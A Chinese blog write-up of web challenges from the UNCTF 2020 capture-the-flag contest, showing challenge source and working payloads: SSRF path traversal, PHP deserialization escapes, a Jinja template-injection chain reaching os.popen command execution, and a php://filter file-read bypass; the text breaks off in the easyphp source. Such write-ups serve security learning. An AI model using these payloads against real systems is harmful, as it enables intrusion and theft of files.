<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="google-site-verification" content="McPiO5BdY1yB87an5v8Lw035aZiGKuLkg736kSbzD_k" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Logo font:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"as1def.github.io","root":"/","scheme":"Gemini","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":9},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="记录unctf2020公开赛的wp，希望与各位师傅们共同学习一下。">
<meta property="og:type" content="article">
<meta property="og:title" content="UNCTF-公开赛Writeup">
<meta property="og:url" content="https://as1def.github.io/2020/11/16/UNCTF2020%E5%85%AC%E5%BC%80%E8%B5%9BWP/index.html">
<meta property="og:site_name" content="As1def&#39;s Blog">
<meta property="og:description" content="记录unctf2020公开赛的wp，希望与各位师傅们共同学习一下。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/image-20201115151222122.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/yaunshen.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/image-20201115161253904.png">
<meta property="og:image" content="c:%5CUsers%5CDrizzle%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201115161509640.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/image-20201115185606658.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/image-20201115185310796.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/wing.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/word.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/hint2.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/rpgsave.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/GG.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/cat.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/zero.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/usb.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/gnuplot.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/py.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/pyc.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/zip.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/docx.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/number.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/pinpu.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/DTMF.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/tupper.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/detupper.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/base.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/baopo.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/shadow.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/john.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/final.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/ok.png">
<meta property="og:image" content="https://as1def.github.io/images/unctf2020/QRCode.png">
<meta property="article:published_time" content="2020-11-16T10:20:53.000Z">
<meta property="article:modified_time" content="2021-04-07T06:18:03.000Z">
<meta property="article:author" content="As1def">
<meta property="article:tag" content="UNCTF">
<meta property="article:tag" content="writewp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://as1def.github.io/images/unctf2020/image-20201115151222122.png">

<link rel="canonical" href="https://as1def.github.io/2020/11/16/UNCTF2020%E5%85%AC%E5%BC%80%E8%B5%9BWP/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>UNCTF-公开赛Writeup | As1def's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="As1def's Blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>
	
	
	<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
	

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line toggle-line-first"></span>
        <span class="toggle-line toggle-line-middle"></span>
        <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">As1def's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://as1def.github.io/2020/11/16/UNCTF2020%E5%85%AC%E5%BC%80%E8%B5%9BWP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="As1def">
      <meta itemprop="description" content="听懂了一首歌,生活中回响着旋律">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="As1def's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          UNCTF-公开赛Writeup
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-11-16 18:20:53" itemprop="dateCreated datePublished" datetime="2020-11-16T18:20:53+08:00">2020-11-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-07 14:18:03" itemprop="dateModified" datetime="2021-04-07T14:18:03+08:00">2021-04-07</time>
              </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>37k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>34 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>记录unctf2020公开赛的wp，希望与各位师傅们共同学习一下。</p>
<a id="more"></a>

<h1 id="UNCTF2020公开赛WP"><a href="#UNCTF2020公开赛WP" class="headerlink" title="UNCTF2020公开赛WP"></a>UNCTF2020公开赛WP</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h4><p>题目给出了源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/unctf\.com/'</span>,$url))&#123;  </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'error!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>源码对我们输入的url变量做了限制，导致不能利用php伪协议读取flag文件</p>
<p>我们就要想办法利用file_get_contents函数打开文件读取。这一函数判断当我们用file协议或不明的协议，就会调回本地文件模式，利用这点我们就可以读取flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">?url=<span class="number">0</span>:<span class="regexp">//u</span>nctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>flag</span><br></pre></td></tr></table></figure></div>



<h4 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h4><p>题目给出了源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>看到源码，我们的目的是让password=’easy’，从而包含flag.php文件，进行输出。</p>
<p>看到filter函数处对我们输入的’challenge’字符串进行了替换，导致php字符逃逸。</p>
<p>我们想要构造形如 ‘“;s:8:”password”;s:4:”easy”;}’的字符串，逃逸28个字符，即需要构造7个challenge</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">?1=challengechallengechallengechallengechallengechallengechallenge";s:<span class="number">8</span>:<span class="string">"password"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"easy"</span>;</span><br></pre></td></tr></table></figure></div>



<h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p>源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>利用点：bool类型 true 可以跟任意字符串弱类型相等。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post传入payload=&gt;</span><br><span class="line">data=<span class="string">a:</span><span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"username"</span>;<span class="string">b:</span><span class="number">1</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;<span class="string">b:</span><span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h4><p>题目提示使用admin登录</p>
<p>访问/register页面进行注册，尝试注册admin账户，可以注册成功。</p>
<p>使用admin进行登录，登录成功，返回index页面，发现返回目录/secret_route_you_do_not_know </p>
<blockquote>
<p>admin login success and check the secret route /secret_route_you_do_not_know</p>
</blockquote>
<p>访问这个目录，提示我们：you should ‘guess’ the secret number ，当我们传入?guess=6，页面回显了6，由此我们判断出需要进行ssti注入。</p>
<p>源码对字符做了很多的过滤，fuzz后，构造出如下命令执行链</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">/secret_route_you_do_not_know?guess=&#123;&#123;()|attr(request.args.<span class="keyword">x</span><span class="number">1</span>)|attr(request.args.<span class="keyword">x</span><span class="number">2</span>)|attr(request.args.<span class="keyword">x</span><span class="number">3</span>)()|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(<span class="number">117</span>)|attr(request.args.<span class="keyword">x</span><span class="number">5</span>)|attr(request.args.<span class="keyword">x</span><span class="number">6</span>)|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(request.args.<span class="keyword">x</span><span class="number">7</span>)|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(request.args.<span class="keyword">x</span><span class="number">8</span>)(request.args.<span class="keyword">x</span><span class="number">9</span>)&#125;&#125;&amp;<span class="keyword">x</span><span class="number">1</span>=__class__&amp;<span class="keyword">x</span><span class="number">2</span>=__base__&amp;<span class="keyword">x</span><span class="number">3</span>=__subclasses__&amp;<span class="keyword">x</span><span class="number">4</span>=__getitem__&amp;<span class="keyword">x</span><span class="number">5</span>=__init__&amp;<span class="keyword">x</span><span class="number">6</span>=__globals__&amp;<span class="keyword">x</span><span class="number">7</span>=__builtins__&amp;<span class="keyword">x</span><span class="number">8</span>=eval&amp;<span class="keyword">x</span><span class="number">9</span>=__import__(<span class="string">"os"</span>).popen('cat flag.txt').read()</span><br></pre></td></tr></table></figure></div>

<p>得到flag。</p>
<h4 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h4><p>题目给出源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/\(.*\)/'</span>, $_GET[<span class="string">'a'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">'flag'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">'ByeBye hacker'</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>过滤条件使我们输入的变量a不能存在文件后缀，而且也不能出现 ‘flag’ 字样。</p>
<p>绕过</p>
<p>利用eval函数，传入include包含变量，执行命令读取flag文件。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">?<span class="keyword">a</span>=<span class="built_in">include</span><span class="variable">$_POST</span>[<span class="number">1</span>]<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></div>



<h4 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h4><p>题目给出/?source提示后做的。</p>
<p>访问题目/?source，得到源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'fuxkSQL'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span><span class="params">($iText)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">'\\\\'</span>, <span class="string">'\\'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">'\"'</span>, <span class="string">'"'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"\'"</span>, <span class="string">"'"</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"'"</span>, <span class="string">"''"</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'getVars'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span 